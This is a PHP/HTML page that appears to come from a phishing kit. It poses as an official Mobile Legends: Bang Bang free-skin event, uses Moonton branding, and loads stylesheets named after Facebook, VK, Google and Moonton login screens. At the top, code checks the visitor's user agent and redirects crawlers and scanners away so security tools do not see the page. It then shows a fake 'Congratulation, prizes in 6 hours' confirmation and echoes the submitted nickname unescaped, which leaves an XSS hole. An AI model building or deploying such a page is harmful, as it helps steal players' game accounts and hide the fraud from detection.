<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: tokoalexhost.com');
die();
}
?><html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <meta name="keywords" content="MLBB, MLBB Evebt, MLBB Free Skin">
        <meta name="description" content="Get claim and draw your free skin now!">
        <meta name="author" content="Alex Ariandi">
        <title>Mobile Legends: Bang Bang</title>
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Mobile Legends: Bang Bang">
        <meta property="og:type" content="website">
        <meta name="copyright" content="Moonton">
        <meta name="theme-color" content="#baaff3">
        <link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
        <meta property="og:image" content="https://i.ibb.co/hY6LgnN/iu-Tt8-Y9wz-C3-YCWg-MGp-Jcswm-XGy-G-t6-XHDy-PDv6-ZLl-GZQb-Ebeu-Lm-Sb-ZGD2-DHw-UB3-ZAv-Y-s180-rw.webp">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/c9f3ddecc56e688f8660a2d31a5beea4909fa5b9/alex-facebook.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3ddd40ca064d997b6655739e7a0e8a65acc106e8/alex-vikontakte.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/1591ba04a57c11f4b18d2ebb39e03e4a81715c83/alex-google.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3fce8843edde49a48905ae1ed9cf237534e547dd/alex-moonton.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/06e649cdc3c3d152f9c275ded79391eeff6eb049/MLBB-rotate.css">
        <link rel="stylesheet" href="alexFrontEnd/css/style-AlexHost.css">
    </head>
    <body>
        <div class="appalexmoba">
            <div id="rotateAlexHosting" style="width: auto; background-color:#10182c; background-repeat: no-repeat; background-position: center center; background-size: 30%; position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto;">
        <div style="display:block; width: auto; background-image: url(https://play.mobilelegends.com/events/collectenergon/images/vertical.png); background-repeat: no-repeat; background-position: center center; background-size: 30%; position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto; animation: rotate 1.5s cubic-bezier(0.57, -0.1, 1, 0.89) infinite alternate;">
        </div>
        </div>
            <div class="conatineralexmoba" id="AlexHosting">
                <div class="headeralexmoba">
                    <div class="kiriheadmoba">
                        <img src="https://rawcdn.githack.com/AlexHostX/logAlex/e0b6e1c2dea4cb77af37b29067e401242514e538/mlbb.webp">
                    </div>
                    <div class="kananheadmoba">
                        <div class="toastmobalex">
                            <p id="toastnick"><?php echo $_POST['nick'];?></p>
                        </div>
                        <div class="rulesmobaalex" onclick="showAlexrules()" onmousedown="buka.play();">
                            <p>?</p>
                        </div>
                    </div>
                </div>
                <div class="banneralexmoba">
                    <div class="slideralexbanner">
                       <iframe width="378" height="182" src="https://www.youtube.com/embed/GWeAitK4VFo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                        
                        </div>
                    </div>
                </div>
                <div class="subverifalex">
                    <div class="ucapansubverifalex">
                        <p>Congratulation</p>
                    </div>
                </div>
                <div class="isimobalaex" style=" padding-bottom: 8em;">
                    <div class="verificationalexmoba">
                        <div class="boxcompletealexmoba">
                            <p>Prizes will be sent within the next 6 hours.<br>Please check your inbox to claim!</p>
                            <button onclick="location.href='./'">Log Out</button>
                        </div>
                    </div>
                </div>
                
                <div class="popalexrulesmoba" style="display: none;">
                    <div class="boxmobapoprules">
                        <div class="closepoprulesalex">
                            <img src="https://i.ibb.co/st4nkTm/closealex-moba.png" onclick="closeAlexrules()" onmousedown="tutup.play();">
                        </div>
                        <div class="boxmobarulesalex">
                            <div class="ucapanpopalexrules">
                                <h3>Rules Event</h3>
                            </div>
                            <div class="steprulesalex">
                                <span>1. During the event, prizes are subject to change at any time without prior notice.</span>
                                <span>2. Only accounts that have been bind can receive gifts.</span>
                                <span>3. You can claim various prizes, ranging from skins to diamonds.</span>
                                <span>4. Draw skins can only be played once for free. It's worth 50 diamonds for the next spin.</span>
                                <span>5. Prizes or prizes from draw spins are sent directly to the in-game inbox and you can claim them from there</span>
                                <span>6. There may be a slight delay in receiving the prize. We appreciate your patience! Please contact Customer Service if you do not receive a gift.</span>
                                <span>7. MLBB reserves the right to have the final interpretation for the above content.</span>
                            </div>
                        </div>
                    </div>
                </div>
                
                
                <iframe scrolling="no" allow="autoplay" src="https://rawcdn.githack.com/AlexHostX/all.asset/001b222ae2a78373bc3a26702125100aedcccfaf/Mobile%20Legends%20Bang%20Bang%20-%20Main%20Theme%20(Live%20Orchestra).mp3" width="0" height="0" frameborder="no"></iframe>
            </div>
        </div>
        <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="alexFrontEnd/js/js-AlexHost.js"></script>
        <script src="https://rawcdn.githack.com/AlexHostX/protect/aaa1462a19b8d8b6cbd68101a5ac89f4955b49de/input-exception.js"></script>
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/protect/a64076479559076b6e31356a0fb6188d291204ce/watermark.css">
    </body>
</html>